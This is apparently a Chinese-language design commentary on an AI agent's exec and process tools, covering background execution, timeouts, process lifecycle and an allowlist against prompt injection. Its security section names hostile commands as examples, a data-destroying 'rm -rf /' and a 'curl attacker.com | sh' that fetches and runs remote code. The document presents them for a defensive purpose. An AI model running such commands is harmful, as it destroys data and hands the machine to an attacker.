# Background exec and process tool

## 架构精读

> 跳过不影响阅读翻译正文。

### exec tool + process tool

**问题**: 长时间运行的命令 (如 `npm install`、`docker build`) 同步等待会阻塞 agent?

**方案**: 两个工具:
- **exec tool**: 执行 shell 命令,默认同步
- **process tool**: 管理后台进程,用于长时间运行的任务

**洞察**: Process tool 让 agent 把长时间运行的命令放到后台,不阻塞当前对话。

**权衡**:
- ✓ 异步: 不阻塞 agent
- ✓ 管理: 可以查看、控制后台进程

**模式**: JavaScript Promise/async-await——同步操作阻塞,异步操作不阻塞。

### 关键参数

**问题**: 如何控制后台进程的行为?

**方案**: exec tool 的关键参数:
- **timeout**: 命令执行的最大时间,超时后杀死
- **background**: `true` = 后台运行,`false` = 前台运行

**洞察**: Timeout 防止进程永远占用资源,background 让命令在后台运行。

**权衡**:
- ✓ 安全: timeout 防止死循环
- ✓ 灵活: background 让长时间命令不阻塞

### 进程生命周期

**问题**: 后台进程什么时候结束?

**方案**: **保持在内存中**,直到:
- 进程自然结束 (命令执行完)
- 被 process tool 杀死 (用户或 agent 主动终止)
- Gateway 重启 (所有进程被杀死)

**洞察**: Agent 需要知道进程状态和输出,进程必须保持在内存中。

**权衡**:
- ✓ 状态: 可以查询进程状态
- ✓ 输出: 可以读取进程输出

**模式**: Docker container 生命周期——运行后保持在内存中,直到被停止或删除。

### process tool 的功能

**问题**: 后台进程不在用户视野里,用户如何管理?

**方案**: process tool 提供:
- **list**: 列出所有后台进程 (PID、命令、状态、运行时间)
- **logs**: 查看进程输出 (stdout、stderr)
- **kill**: 杀死进程

**洞察**: 提供进程管理功能,用户可以查看和控制后台进程。

**权衡**:
- ✓ 可见: 知道有哪些进程在运行
- ✓ 可控: 可以杀死进程

**模式**: `ps`、`tail`、`kill` 命令——Linux 进程管理工具。

### 安全风险

**问题**: shell 命令可能很危险 (`rm -rf /`、`curl attacker.com | sh`、`sudo`)?

**方案**: exec tool 受 **allowlist** 控制:
```json
{
  tools: {
    allow: ["exec"],
    exec: {
      allowlist: ["ls", "cat", "grep"]
    }
  }
}
```

**洞察**: 限制 agent 只能执行允许的命令,防止恶意 prompt 注入。

**权衡**:
- ✓ 安全: 防止危险命令
- ✗ 限制: 不能执行 allowlist 外的命令

**模式**: SELinux 白名单策略——默认拒绝所有操作,只允许白名单里的操作。
